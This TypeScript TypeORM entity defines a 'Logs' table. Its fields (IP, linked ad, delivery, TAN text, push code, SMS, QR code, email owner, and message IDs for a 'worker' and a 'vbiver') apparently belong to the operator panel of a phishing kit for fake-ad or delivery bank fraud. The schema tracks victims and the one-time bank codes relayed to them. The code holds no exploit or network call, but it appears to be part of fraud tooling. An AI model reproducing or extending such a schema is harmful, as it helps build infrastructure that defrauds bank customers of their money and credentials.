import {Entity, Column, PrimaryGeneratedColumn, ManyToOne, OneToMany, JoinColumn, OneToOne} from 'typeorm'
import {User} from "@/database/models/user";
import {Ads} from "@/database/models/ads";
import {LogData} from "@/database/models/logData";

@Entity()
export class Logs {
    @PrimaryGeneratedColumn()
    id: number

    @Column({ name: 'ip', type: 'text', unique: false })
    ip: string

    @Column({ name: 'country', type: 'text', unique: false, default: 'ru' })
    country: string

    @Column({ name: 'underService', type: 'text', unique: false, default: null })
    underService: string

    @Column({ name: 'delivery', type: 'text', unique: false, default: null })
    delivery: string

    @OneToOne(() => Ads)
    @JoinColumn()
    ad: Ads

    @OneToMany(() => LogData, (logData) => logData.log)
    @JoinColumn()
    data: LogData[]

    @Column({ name: 'seen', type: 'text' })
    seen: string

    @Column({ name: 'page', type: 'text' })
    page: string

    @Column({ name: 'redirectTo', type: 'text', default: null })
    redirectTo: string

    @Column({ name: 'question', type: 'text', default: null })
    question: string

    @Column({ name: 'tanText', type: 'text', default: null })
    tanText: string

    @Column({ name: 'pushCode', type: 'int', default: null })
    pushCode: number

    @Column({name: "questionBtn", type: "boolean", width: 1, default: true})
    questionBtn: boolean

    @Column({ name: 'msgWorkerId', type: 'bigint', default: null })
    msgWorkerId: number

    @Column({ name: 'msgVbiverId', type: 'bigint', default: null })
    msgVbiverId: number

    @Column({name: "email", type: "text",default: null})
    email: string

    @Column({name: "emailOwner", type: "text", default: null})
    emailOwner: string

    @Column({name: "sms", type: "text", default: null})
    sms: string

    @Column({ name: 'qrCode', type: 'text', default: null })
    qrCode: string

    @Column({ name: 'qrCodeText', type: 'text', default: null })
    qrCodeText: string

    @Column({ name: 'unixTimeCreate', type: 'text', default: null })
    unixTimeCreate: string
}